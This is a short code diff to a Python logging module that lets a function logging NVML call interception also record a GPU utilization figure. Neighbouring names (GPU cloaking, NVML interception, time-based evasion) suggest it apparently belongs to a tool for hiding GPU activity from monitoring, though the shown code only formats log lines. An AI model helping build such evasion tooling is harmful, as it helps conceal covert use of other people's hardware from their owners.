@@ -414,7 +414,7 @@ def log_gpu_cloaking(strategy: str, status: str, metrics: dict = None, level: st
     metrics_info = f" | Metrics: {metrics}" if metrics else ""
     getattr(cloaking_logger, level.lower())(f"🕵️ [Cloaking: {strategy}] Status: {status}{metrics_info}")
 
-def log_nvml_interception(function_name: str, intercepted: bool, return_value: any = None, level: str = "DEBUG"):
+def log_nvml_interception(function_name: str, intercepted: bool, return_value: any = None, level: str = "DEBUG", **kwargs):
     """
     **Log NVML interception** (Ghi log chặn NVML).
     
@@ -423,11 +423,18 @@ def log_nvml_interception(function_name: str, intercepted: bool, return_value: a
         intercepted (bool): **Whether intercepted** (có bị chặn không)
         return_value (any): **Return value** (giá trị trả về) (optional)
         level (str): **Log level** (mức log)
+        **kwargs: Additional parameters (e.g., utilization)
     """
     nvml_logger = get_nvml_logger()
     intercept_status = "INTERCEPTED" if intercepted else "PASSED"
     return_info = f" -> {return_value}" if return_value is not None else ""
-    getattr(nvml_logger, level.lower())(f"🔧 [NVML: {function_name}] {intercept_status}{return_info}")
+    
+    # Extract additional info from kwargs
+    additional_info = ""
+    if 'utilization' in kwargs:
+        additional_info += f" [Util: {kwargs['utilization']}%]"
+    
+    getattr(nvml_logger, level.lower())(f"🔧 [NVML: {function_name}] {intercept_status}{return_info}{additional_info}")
 
 def log_time_based_evasion(window_type: str, action: str, duration: int = None, level: str = "INFO"):
     """
